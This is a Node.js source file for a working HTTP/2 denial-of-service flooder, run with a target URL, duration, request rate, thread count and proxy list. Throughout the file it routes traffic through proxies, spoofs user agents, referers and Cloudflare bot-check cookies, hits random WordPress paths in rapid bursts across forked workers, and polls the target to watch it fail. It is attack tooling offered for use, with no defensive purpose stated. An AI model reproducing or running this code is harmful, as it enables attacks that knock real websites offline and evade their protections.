const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const UserAgent = require('user-agents');
const fs = require('fs');
const https = require('https');
const axios = require('axios');
const errorHandler = error => {
  //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

if (process.argv.length < 7) {
  console.log('node anus.js host time rps threads proxy');
  process.exit();
}

const headers = {};
 const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `[\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m]`;
  };
  const agent = new https.Agent({ rejectUnauthorized: false });
  const targeturl = process.argv[2];

function readLines(filePath) {
  return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/);
}
  function getStatus() {
  const timeoutPromise = new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(new Error('Request Timed Out'));
    }, 5000);
  });

  const axiosPromise = axios.get(targeturl, { httpsAgent: agent });

  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { status, data } = response;
      console.log(`${getCurrentTime()} [Horikita]  Title: ${getTitleFromHTML(data)} [\x1b[32m${status}\x1b[0m]`);
    })
    .catch((error) => {
      if (error.message === 'Request Timed Out') {
        console.log(`${getCurrentTime()} [Horikita]  Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [Horikita]  Title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [Horikita]  ${error.message}`);
      }
    });
}


 function getTitleFromHTML(html) {
   const titleRegex = /<title>(.*?)<\/title>/i;
   const match = html.match(titleRegex);
   if (match && match[1]) {
     return match[1];
   }
   return 'Not Found';
 }
function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randstr(length) {
    const characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }
  
function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}
function randomIp() {
    const segment1 = Math.floor(Math.random() * 256);
    const segment2 = Math.floor(Math.random() * 256);
    const segment3 = Math.floor(Math.random() * 256);
    const segment4 = Math.floor(Math.random() * 256);

    return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

function getrandompath() {
    const listpath = [
        "watch.php",
        "pages.php",
        "search.php",
        "secure.php",
        "plugins.php",
        "wp-login.php",
        "wp-mail.php",
        "wp-pass.php",
        "wp-rdf.php",
        "wp-register.php",
        "wp-settings.php",
    ];
    return listpath[Math.floor(Math.random() * listpath.length)];
}
function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });

    return randomStringArray.join('');
}
function generateRandomChar(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });

    return randomStringArray.join('');
}
function getrandomextensions() {
    const extensions = [
        ".css",
        ".js",
        ".sql",
        ".mp4",
        ".mp3",
        ".txt",
        ".jpg",
        ".png",
        ".gif",
        ".svg",
        ".ico",
    ];
    return extensions[Math.floor(Math.random() * extensions.length)];
}
const ciphersList = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA",
    "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
];
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.3',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.6478.108 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/126.2592.86 Mobile/15E148 Safari/605.1.15',
];

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6],
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  setInterval(getStatus, 2000);
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}

function generateCookieString(parsedTarget) {
    const cookieName = Math.random() < 0.5 ? "__cf_bm" : "cf_clearance";
    const cookieValue = randstr(90);
    const expires = new Date(Date.now() + 3600000).toUTCString(); 
    const domain = parsedTarget.host;
    const path = parsedTarget.path;
    const cookieString = `${cookieName}=${cookieValue}; path=${path}; expires=${expires}; domain=www.${domain}; HttpOnly; Secure; SameSite=None`;
    return cookieString;
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const parsedAddr = options.address.split(':');
    const addrHost = parsedAddr[0];
    const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const buffer = Buffer.from(payload);
    const connection = net.connect({
      host: options.host,
      port: options.port,
    });

    connection.setTimeout(options.timeout * 10000);
    connection.setKeepAlive(true, 60000);

    connection.on('connect', () => {
      connection.write(buffer);
    });

    connection.on('data', (dontario) => {
      const samoan = dontario.toString('utf-8');
      const adien = samoan.includes('HTTP/1.1 200');

      if (adien === false) {
        connection.destroy();
        return callback(undefined, 'error: invalid response from proxy server');
      }

      return callback(connection, undefined);
    });

    connection.on('timeout', () => {
      connection.destroy();
      return callback(undefined, 'error: timeout exceeded');
    });

    connection.on('error', (elric) => {
      connection.destroy();
      return callback(undefined, 'error: ' + elric);
    });
  }
}

const Header = new NetSocket();

headers[':method'] = 'GET';
headers[':authority'] = Math.random() < 0.5 ? `${parsedTarget.host}:443` : `www.${parsedTarget.host}`;
headers[':path'] = Math.random() < 0.5 ? `${parsedTarget.path}${getrandompath()}?horikita=${generateRandomString(10, 15)}` : `${parsedTarget.path}/horikita=${generateRandomChar(1, 5)}${getrandompath()}`;
headers[':scheme'] = 'https';
headers['referer'] = Math.random() < 0.5 ? `http://${randomIp()}${getrandompath()}?horikita` : `https://${generateRandomChar(5, 10)}` + (Math.random() < 0.5 ? `.com/${getrandompath()}?horikita` : `.net/${getrandompath()}?horikita`);
headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
headers['accept-language'] = 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3';
headers['x-trigger-horikita-service'] = "true";
headers['upgrade-insecure-requests'] = '1';
headers['cookie'] = generateCookieString(parsedTarget);
headers['sec-fetch-dest'] = 'document';
headers['sec-fetch-site'] = 'cross-site';
headers['sec-fetch-mode'] = 'navigate';
headers['sec-fetch-user'] = '?1';
headers['horikita-purpose'] = 'prefetch';

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(':');
  const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
  headers[':authority'] = parsedTarget.host;
  headers['user-agent'] = randomElement(userAgents);

  const proxyOptions = {
    host: parsedProxy[0],
    port: parseInt(parsedProxy[1]),
    address: `${parsedTarget.host}:443`,
    timeout: 10,
  };

  Header.HTTP(proxyOptions, (connection, error) => {
    if (error) {
      return;
    }
    connection.setKeepAlive(true, 60000);

    const tlsOptions = {
      ALPNProtocols: ['h2'],
      followAllRedirects: true,
      checkServerIdentity: () => undefined,
      echdCurve: 'GREASE:X25519:x25519:P-256:P-384:P-521:X448',
      ciphers: ciphersList.join(':'),
      rejectUnauthorized: false,
      socket: connection,
      honorCipherOrder: true,
      secure: true,
      servername: parsedTarget.host,
      secureProtocol: "TLS_client_method",
    };

    const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsSocket.setKeepAlive(true, 600000);
    tlsSocket.setNoDelay(true);
    
    const client = http2.connect(`https://${parsedTarget.host}`, {
      protocol: 'https:',
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsSocket,
      socket: connection,
    });

    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 20000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false,
    });

    client.on('connect', () => {
      const intervalId = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          const req = client.request(headers).on('response', (response) => {
            req.close();
            req.destroy();
            return;
          });
          req.end();
        }
      }, 500);
    });

    client.on('close', () => {
      client.destroy();
      connection.destroy();
      return;
    });

    client.on('error', (error) => {
      client.destroy();
      connection.destroy();
      return;
    });
  });
}

const KillScript = () => process.exit(4);
setTimeout(KillScript, args.time * 1000);
